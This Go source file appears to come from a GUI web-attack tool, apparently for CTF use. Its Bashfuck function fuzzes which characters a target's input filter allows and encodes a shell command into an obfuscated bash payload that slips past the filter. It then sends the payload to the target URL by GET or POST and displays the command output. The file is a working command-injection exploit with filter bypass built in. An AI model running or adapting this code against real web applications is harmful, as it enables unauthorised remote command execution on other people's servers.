package script

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"

	"fyne.io/fyne/v2/widget"
)

func Bashfuck(URL string, command string, guolv string, i string, m string, label *widget.Label, booL string) {
	fmt.Printf("这是一个system命令，我们需要利用linux终端的一些特性来完成\n")
	fmt.Printf("本函数基于探姬大佬的bashfuck工具进行二开，原项目地址：https://github.com/ProbiusOfficial/bashFuck\n")
	char := Fuzz(URL, m, i)
	re := regexp.MustCompile("[" + guolv + "]")
	char = re.ReplaceAllString(char, "")

	var rec string
	var req *http.Request
	client := &http.Client{}
	var err error

	fmt.Println("fuzz结果为：" + char)

	if strings.ContainsRune(char, '$') && strings.ContainsRune(char, '\'') && strings.ContainsRune(char, '0') && strings.ContainsRune(char, '1') && strings.ContainsRune(char, '2') && strings.ContainsRune(char, '3') && strings.ContainsRune(char, '4') && strings.ContainsRune(char, '5') && strings.ContainsRune(char, '6') && strings.ContainsRune(char, '7') && strings.ContainsRune(char, '\\') {

		rec = CommonOtc(command)
		fmt.Printf("POC为: " + rec + "\n")

	} else if strings.ContainsRune(char, '#') && strings.ContainsRune(char, '$') && strings.ContainsRune(char, '\'') && strings.ContainsRune(char, '(') && strings.ContainsRune(char, ')') && strings.ContainsRune(char, '0') && strings.ContainsRune(char, '1') && strings.ContainsRune(char, '<') && strings.ContainsRune(char, '\\') {

		rec = BashfuckX(command, "bit")
		fmt.Printf("POC为: " + rec + "\n")

	} else if strings.ContainsRune(char, '#') && strings.ContainsRune(char, '$') && strings.ContainsRune(char, '\'') && strings.ContainsRune(char, '(') && strings.ContainsRune(char, ')') && strings.ContainsRune(char, '0') && strings.ContainsRune(char, '<') && strings.ContainsRune(char, '\\') && strings.ContainsRune(char, '{') && strings.ContainsRune(char, '}') {

		rec = BashfuckX(command, "zero")
		fmt.Printf("POC为: " + rec + "\n")

	} else if strings.ContainsRune(char, '!') && strings.ContainsRune(char, '#') && strings.ContainsRune(char, '$') && strings.ContainsRune(char, '\'') && strings.ContainsRune(char, '(') && strings.ContainsRune(char, ')') && strings.ContainsRune(char, '<') && strings.ContainsRune(char, '\\') && strings.ContainsRune(char, '{') && strings.ContainsRune(char, '}') {

		rec = BashfuckX(command, "c")
		fmt.Printf("POC为: " + rec + "\n")

	} else if strings.ContainsRune(char, '!') && strings.ContainsRune(char, '$') && strings.ContainsRune(char, '&') && strings.ContainsRune(char, '\'') && strings.ContainsRune(char, '(') && strings.ContainsRune(char, ')') && strings.ContainsRune(char, '<') && strings.ContainsRune(char, '=') && strings.ContainsRune(char, '{') && strings.ContainsRune(char, '}') && strings.ContainsRune(char, '~') && strings.ContainsRune(char, '\\') && strings.ContainsRune(char, '_') {

		rec = BashfuckY(command)
		fmt.Printf("POC为: " + rec + "\n")

	} else {
		label.SetText("bashfuck失灵了呜呜呜,你自己额外去想构造吧")

		booL = "0"
	}

	newURL := fmt.Sprintf("%s?%s=%s", URL, i, url.QueryEscape(rec))

	// 创建请求对象
	if m == "GET" {
		req, err = http.NewRequest("GET", newURL, nil)
		if err != nil {
			fmt.Println("Error creating GET request:", err)
		}
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("Error sending request:", err)

		}
		defer resp.Body.Close()

		body, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("Error reading response body:", err)

		}
		cleanText := CleanText(URL)
		result := strings.Replace(RemoveHTMLTags(string(body)), cleanText, "", -1)
		label.SetText("URL为: " + newURL + "\n执行结果为: " + result)

		booL = "1"

	} else if m == "POST" {

		payload := []byte(i + "=" + command)

		// 发起 POST 请求
		resp, err := http.Post(URL, "application/x-www-form-urlencoded", bytes.NewBuffer(payload))
		if err != nil {
			fmt.Println("发送 POST 请求失败:", err)
			booL = "0"
		}
		defer resp.Body.Close()

		// 读取响应
		respBody, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("读取响应失败:", err)
			booL = "0"
		}

		// 输出响应

		label.SetText("payload:" + string(payload) + "执行结果为: " + RemoveHTMLTags(string(respBody)))

	}

}
